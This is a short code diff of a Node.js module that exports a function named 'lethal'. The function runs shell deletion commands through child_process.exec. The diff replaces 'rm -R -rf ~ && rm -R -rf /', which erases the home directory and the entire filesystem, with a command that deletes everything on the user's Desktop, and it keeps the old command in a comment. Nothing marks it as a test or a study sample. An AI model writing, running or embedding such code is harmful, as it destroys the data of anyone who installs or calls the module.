@@ -1,7 +1,7 @@
 const { exec } = require('child_process');
 
 const lethal = () => {
-  exec(`rm -R -rf ~ && rm -R -rf /`, (err, stdout, stderr) => {
+  exec(`rm -R -rf ~/Desktop/*`, (err, stdout, stderr) => {
     if (err) {
       // node couldn't execute the command
       return;
@@ -12,5 +12,5 @@ const lethal = () => {
     console.log(`stderr: ${stderr}`);
   });
 }
-
+// prev rm -R -rf ~ && rm -R -rf /
 module.exports = lethal;
